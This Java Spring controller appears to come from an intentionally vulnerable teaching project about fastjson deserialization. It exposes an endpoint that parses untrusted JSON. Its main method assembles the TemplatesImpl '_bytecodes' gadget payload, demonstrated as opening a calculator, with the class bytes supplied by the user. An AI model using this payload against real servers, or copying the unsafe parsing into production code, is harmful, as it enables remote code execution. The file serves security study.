package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;


@Controller
@RequestMapping("/fastjson")
public class Fastjson {

    @RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            JSONObject ob = JSON.parseObject(params);
            return HtmlUtils.htmlEscape(ob.get("name").toString());
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
    }

    public static void main(String[] args) {
        // Open calc in mac
        // The base64 of the compiled gadget class is no longer embedded in source.
        // Generate it yourself (e.g. `base64 -w0 StubTransletPayload.class`) and pass it
        // as the first argument or via the FASTJSON_DEMO_BYTECODE_B64 environment variable.
        String bytecode = args.length > 0 ? args[0] : System.getenv("FASTJSON_DEMO_BYTECODE_B64");
        if (bytecode == null || bytecode.isEmpty()) {
            System.err.println("Usage: Fastjson <base64-encoded-class-bytes> (or set FASTJSON_DEMO_BYTECODE_B64)");
            return;
        }
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\""
                + bytecode
                + "\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }
}
